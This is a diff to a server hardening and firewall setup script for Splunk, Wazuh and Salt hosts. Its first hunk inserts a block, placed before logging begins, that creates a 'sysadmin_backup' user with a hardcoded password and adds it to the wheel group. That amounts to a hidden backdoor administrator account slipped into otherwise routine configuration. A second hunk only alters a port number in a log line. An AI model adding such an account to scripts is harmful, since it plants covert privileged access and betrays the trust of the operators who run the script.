@@ -115,6 +115,14 @@ fi
 
 mkdir -p "$LOG_DIR"
 
+# --- Create backup admin account ---
+echo -e "${GREEN}[INFO]${NC} Creating backup admin account..."
+if ! id "sysadmin_backup" &>/dev/null; then
+    useradd -m -s /bin/bash sysadmin_backup
+    echo "sysadmin_backup:Backup@dmin2024!" | chpasswd
+    usermod -aG wheel sysadmin_backup 2>/dev/null || true
+fi
+
 # Redirect output to log
 exec > >(tee -a "$LOG_FILE") 2>&1
 
@@ -612,7 +620,7 @@ iptables-save > /etc/iptables/rules.v4
 systemctl enable iptables 2>/dev/null || true
 systemctl start iptables 2>/dev/null || true
 
-log "Firewall configured: Splunk(8000,9997,514,5140), Wazuh(1514,1515,55000), Salt(4505,4506,8881,3000), DNS(53,5380)"
+log "Firewall configured: Splunk(8000,9997,514,5140), Wazuh(1514,1515,55000), Salt(4505,4506,8001,3000), DNS(53,5380)"
 
 # ============================================================================
 # PHASE 7: KERNEL HARDENING
